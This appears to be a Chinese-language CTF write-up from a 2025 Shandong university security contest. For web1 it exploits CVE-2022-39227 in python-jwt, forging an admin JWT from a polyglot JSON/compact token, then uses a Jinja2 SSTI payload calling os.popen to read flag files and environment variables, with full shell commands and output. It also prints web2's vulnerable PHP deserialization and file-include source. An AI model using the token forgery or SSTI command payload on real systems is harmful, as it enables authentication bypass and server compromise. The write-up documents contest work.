# 2025山东省大学生网络安全技能大赛 

两道题只出了一个

### web1_fix

1. **JWT 验证绕过与提权**
   受影响版本的 `python-jwt` 会同时接受 JSON JWS 与 compact JWS。将一枚**合法签名的 compact JWT**拆成 `header.payload.signature`，再构造一个 **JSON 形式**的 JWS，把这三个字段原样放在 `"protected"|"payload"|"signature"`，同时在 JSON 的最前面再放入一个**假的 compact 片段**：`"header.fake_payload."`。库在验签时使用 JSON 部分的签名通过校验，但在返回 claims 时却读取前面的**假 payload**，从而实现**不改签名的 claim 覆写**（把 `role` 提升为 `admin`）。

2. **Jinja2 模板注入（SSTI）**
   `/api/report/generate` 在 `template` 非空时把整页交给 `render_template_string`。代码只对 `template` 参数检查 `{{`，但**未过滤 `title` 与用户姓名**。可在 `title` 注入表达式读取本地文件。

   

**打cve-2022-39227**

https://chatgpt.com/share/e/68d76f56-8f84-8005-ad72-0a815c605052

```bash
──(kali㉿kali)-[~/Desktop/temp]
└─$ BASE='http://119.45.255.233:29665'
                                                              
┌──(kali㉿kali)-[~/Desktop/temp]
└─$ TOKEN=$(curl -s "$BASE/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","password":"guest"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')
echo "$TOKEN"

eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTIxMTcsImlhdCI6MTc1ODk0NDkxNywianRpIjoiZ1hxczVVVkhJMTZYTUZ2ZlVxaTVHQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk0NDkxNywicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9.Yf8hKDyDassxe7yEmREx4Iskb5zVKSywZz4eA-aUMLc3uEOfGLejqb2vBqkzhZlBAg0h7dvtef9qsJ7M8A30mG9i-WWU1_N7A7G1X_tZLQwN1buZZ34DEIN1_XsUM52-E3bymHI-I9mRH3TGdAsGDgsG4OYe30RagjhJklLOMcxa98o76NG0dI03PUnK5gOlVwcPJbOlIpXYkQoTkwrRSsDOsnjVZEHEL3w6HDyz6qblYjeOAgbzzPny0J-HBe15VhxRvtKgf4f-9hiVCB7k8Ei7F-HI5f3qMMay2grX5P762OhVKtq4VmfDDwiBfKxPCarSdIzsOt-w0SCEiZOrWw
                                                              
┌──(kali㉿kali)-[~/Desktop/temp]
└─$ python3 - "$TOKEN" > body.json <<'PY'
import sys, json, base64
tok = sys.argv[1]
h,p,s = tok.split('.')
pl = json.loads(base64.urlsafe_b64decode(p + '=='))
pl.update({"role":"admin","username":"admin"})
fake_p = base64.urlsafe_b64encode(json.dumps(pl, separators=(',',':')).encode()).decode().rstrip('=')
poly = '{"%s.%s.":"","protected":"%s","payload":"%s","signature":"%s"}' % (h,fake_p,h,p,s)
print(json.dumps({"token": poly}))
PY
                                                              
┌──(kali㉿kali)-[~/Desktop/temp]
└─$ curl -s "$BASE/api/verify-token" \
  -H 'Content-Type: application/json' \
  --data-binary @body.json

{"payload":{"department":"guest","exp":1758952117,"iat":1758944917,"jti":"gXqs5UVHI16XMFvfUqi5GA","name":"guest","nbf":1758944917,"role":"admin","username":"admin"},"valid":true}
                                                              
┌──(kali㉿kali)-[~/Desktop/temp]
└─$ POLY=$(python3 -c 'import json;print(json.load(open("body.json"))["token"])')
                                                              
┌──(kali㉿kali)-[~/Desktop/temp]
└─$ curl -s "$BASE/api/report/generate" \
  -H "Authorization: Bearer $POLY" \
  -H 'Content-Type: application/json' \
  -d '{
        "company_id": 1,
        "title": "{{ config.__class__.__init__.__globals__[\"os\"].popen(\"cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || env | grep -i FLAG\").read() }}",
        "template": "ok"
      }' | sed -n 's/.*<title>\(.*\)<\/title>.*/\1/p'
flag{2b85a02b4f6d0f49ca05f766c68ff506}\n

```



### web2（仅有源码）

```php
<?php
error_reporting(0);
session_start();
show_source(__FILE__);

class DatabaseWork
{
    public $hostname = "localhost";
    public $dbuser = "root";
    public $dbpass = "root";
    public $database;

    public function __construct($database)
    {
        $this->database = $database;
    }
    public function __wakeup() {
        if ($this->hostname === 'localhost') {
            echo "connect to " . $this->database;
        }
    }
}

class DatabaseConnectHandle
{
    public $connect;
    public $params;
    public function __construct()
    {
        $this->connect = array("127.0.0.1","root","root");
    }
    public function __toString()
    {
        return $this->getfunction();  
    }
    public function getfunction()
    {
        $func = $this->params;
        $func();
        return "config";
    }
}

class ConfigFileUploader {
    public function __invoke(){
        if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
            exit('upload error');
        }
        $file = $_FILES['file'];
        $fileName = basename($file['name']);
        $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

        if (!in_array($fileExt, ['ini'])) {
            exit('only config.ini');
        }

        $fileContent = file_get_contents($file['tmp_name']);

        if (strpos($fileContent, '<') !== false) {
            exit('No hacker !');
        }

        $destination = "/tmp/". $fileName;
        if (move_uploaded_file($file['tmp_name'], $destination)) {
            exit($destination);
        }
        exit("upload failed");
    }
}

class ConfigFileviewer {

    public $path;

    public function __invoke(){
        return $this->includeFile($this->path); 
    }
    public function includeFile($path) {
        if (preg_match('/filter|log|flag|proc|root|\.\.|home/i',$path)){
            exit("No !");
        }
        include "/tmp/".basename($path);
    }
}



$data = $_GET['data'];
if (preg_match("/flag|zip|base|read|zlib|rot|string|code/i",$data)){
    exit("No hack!");
}
file_put_contents($data,file_get_contents($data));
```

<p style="text-align: right;">
by. Huaji
</p>

